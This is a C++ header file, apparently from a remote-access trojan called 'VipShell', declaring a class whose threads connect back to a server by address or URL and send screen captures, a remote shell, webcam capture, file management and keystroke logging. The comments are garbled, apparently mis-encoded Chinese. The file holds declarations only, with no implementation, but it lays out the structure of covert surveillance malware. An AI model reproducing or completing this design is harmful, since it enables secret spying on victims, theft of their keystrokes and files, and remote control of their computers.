#pragma once
#include "stdafx.h"

#define CREATE_THREAD_MARKER_CONNECTSERVER 0   //��һ������ 
#define CREATE_THREAD_MARKER_SCREENINFO    1   //������Ƶ���
#define CREATE_THREAD_MARKER_SHELLCOMMAND  2   //����shell
#define CREATE_THREAD_MARKER_GETCAP        3   //��������ͷ
#define CREATE_THREAD_MARKER_FILEMANAGE    4   //FILEMANAGE
#define CREATE_THREAD_MARKER_GETKEYLOG    5   //���̼�¼
#define CREATE_THREAD_MARKER_CONNECTSERVERBYURL 6   //����URL����
class CVipShellEx : public CThreadBase
{
	struct tagServerAddr
	{
//		CVipShellCTcpClient hServer;
		std::wstring strAddr;
		DWORD dwPort;
		DWORD dwConnectId;
	};

	tagServerSystemInfo sysinfo;
public:
	CVipShellEx(void);
	~CVipShellEx(void);
public:
	virtual void OnNewThread(DWORD dwCreateMarker, DWORD dwThreadId, LPVOID lpParameter);
	void ConnectServer(LPCWSTR szServer, DWORD dwPort);
	void ConnectServer(LPCWSTR szUrl);
	void ConnectServerEx(LPCWSTR szServer, DWORD dwPort, DWORD dwType, DWORD dwConnectId = 0);
	void ConnectServerEx(ULONG ip, DWORD dwPort, DWORD dwType, DWORD dwConnectId = 0);
	tagServerSystemInfo* GetServerSystemInfo();
	void SetExplain(LPCWSTR szExplain);
protected:
	void _Init();
protected:
	void _ThreadConnectServer(tagServerAddr* pInfo, DWORD dwThreadId);
	void _ThreadConnectServerByUrl(tagServerAddr* pInfo, DWORD dwThreadId);
	void _ThreadSendScreenInfo(tagServerAddr* pInfo, DWORD dwThreadId);
	void _ThreadSendShell(tagServerAddr* pInfo, DWORD dwThreadId);
	void _ThreadSendCap(tagServerAddr* pInfo, DWORD dwThreadId);
	void _ThreadSendFileManage(tagServerAddr* pInfo, DWORD dwThreadId);
	void _ThreadSendGetKeyLogNoHook(tagServerAddr* pInfo, DWORD dwThreadId);
};


